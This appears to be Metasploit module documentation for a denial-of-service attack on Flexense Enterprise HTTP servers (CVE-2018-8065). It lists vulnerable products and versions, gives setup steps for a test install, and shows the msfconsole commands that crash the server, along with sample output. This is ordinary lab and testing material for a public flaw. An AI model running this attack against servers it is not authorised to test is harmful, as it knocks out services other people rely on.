## Description
This module triggers a Denial of Service vulnerability in the Flexense Enterprise HTTP server. It is possible to trigger 
a write access memory vialation via rapidly sending HTTP requests with large HTTP header values.  


## Verification Steps
According To publicly exploit Disclosure of Flexense HTTP Server v10.6.24
Following list of softwares are vulnerable to Denial Of Service.
read more : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8065

	
DiskBoss Enterprise    <= v9.0.18
Sync Breeze Enterprise <= v10.6.24
Disk Pulse Enterprise  <= v10.6.24
Disk Savvy Enterprise  <= v10.6.24
Dup Scout Enterprise   <= v10.6.24
VX Search Enterprise   <= v10.6.24


**Vulnerable Application Link** 
http://www.diskboss.com/downloads.html
http://www.syncbreeze.com/downloads.html
http://www.diskpulse.com/downloads.html
http://www.disksavvy.com/downloads.html
http://www.dupscout.com/downloads.html


## Vulnerable Application Installation Setup.
All Flexense applications that are listed above can be installed by following these steps.

Download Application : ```https://github.com/EgeBalci/Sync_Breeze_Enterprise_10_6_24_-DOS/raw/master/syncbreezeent_setup_v10.6.24.exe```

**And Follow Sync Breeze Enterprise v10.6.24 Setup Wizard**

After the installation navigate to: ```Options->Server```

Check the box saying: ```Enable web server on port:...```

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: `use auxiliary/dos/http/flexense_http_server_dos`
  4. Do: `set rport <port>`
  5. Do: `set rhost <ip>`
  6. Do: `check`
```
[+] 192.168.1.20:80 The target is vulnerable.
```
  7. Do: `run`
  8. Web server will crash after 200-1000 request depending on the OS version and system memory.

## Scenarios
**TESTED AGAINST WINDOWS 7/10**
```
msf5 > use auxiliary/dos/http/flexense_http_server_dos 
msf5 auxiliary(dos/http/flexense_http_server_dos) > set rhost 192.168.1.27
rhost => 192.168.1.27
msf5 auxiliary(dos/http/flexense_http_server_dos) > set rport 80
rport => 80
msf5 auxiliary(dos/http/flexense_http_server_dos) > run

[*] 192.168.1.20:80 - Triggering the vulnerability
[+] 192.168.1.20:80 - DoS successful 192.168.1.20 is down !
[*] Auxiliary module execution completed

```
